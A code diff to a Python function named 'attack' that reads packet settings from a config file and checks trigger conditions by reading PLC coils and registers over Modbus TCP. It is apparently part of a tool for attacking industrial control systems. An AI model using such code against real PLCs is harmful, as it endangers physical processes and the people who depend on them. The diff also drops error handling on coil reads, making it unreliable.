@@ -11,12 +11,8 @@ def attack(ctx):
         config = configparser.ConfigParser()
         config.read('config.ini')
 
-        print(address)
-
         pckt_number = config.get('params', 'packets_number')
         pckt_value = int(config.get('params', 'packets_value'))
-
-        print(checkTrigger(address))
 
         if(pckt_number == "loop"): 
             while(True):
@@ -146,6 +142,8 @@ def attack(ctx):
                     # Determine the device type and number
                     device_type = device[0]
                     device_number = int(device[1:])
+                    
+                    value = int(value)
 
                     client = ModbusTcpClient(ip, port)
                     # Connect to the PLC
@@ -153,32 +151,58 @@ def attack(ctx):
 
                     if device_type == 'c':
                         result = client.read_coils(device_number, 1, unit=1)
-                        if not result.isError() and len(result.bits) == 1:
-                            coil_value = bool(result.bits[0])  # Convert to boolean
-                            print(f"Value of coil {device_number}: {coil_value}")
-                        else:
-                            print(f"Error reading coil {device_number}")
+                        coil_value = bool(result.bits[0])  # Convert to boolean
+                        print(f"Value of coil {device_number}: {coil_value}")
+
+                        if(cond == ">" or cond == "<"):
+                            print("Condition error.")
+                        elif(cond == "is"):
+                            if(coil_value != value):
+                                return False
+                        elif(cond == "is not"):
+                            if(coil_value == value):
+                                return False
+
                     elif device_type == "i":
                         result = client.read_input_registers(device_number, 1, unit=1)
                         if not result.isError() and len(result.registers) == 1:
-                            input_register_value = result.registers[0]
+                            input_register_value = int(result.registers[0])
                             print(f"Value of input register {device_number}: {input_register_value}")
                         else:
                             print(f"Error reading input register {device_number}")
+
+                        if(cond == ">"):
+                            if(input_register_value < value):
+                                return False
+                        elif(cond == "<"):
+                            if(input_register_value > value):
+                                return False
+                        else:
+                            print("Condition error.")
+                            
+
                     elif device_type == "m":
-                        result = client.read_holding_registers(device_number, 1, unit=1)
+                        result = client.read_holding_registers(device_number+1024, 1, unit=1)
                         if not result.isError() and len(result.registers) == 1:
-                            holding_register_value = result.registers[0]
+                            holding_register_value = int(result.registers[0])
                             print(f"Value of holding register {device_number}: {holding_register_value}")
                         else:
                             print(f"Error reading holding register {device_number}")
+
+                        if(cond == ">"):
+                            if(holding_register_value < value):
+                                return False
+                        elif(cond == "<"):
+                            if(holding_register_value > value):
+                                return False
+                        else:
+                            print("Condition error.")
+
                     else:
                         print(f"Unsupported device type: {device_type}")
 
+
                     client.close()
-
-                    #TODO
-
 
         return all_conditions_true
     
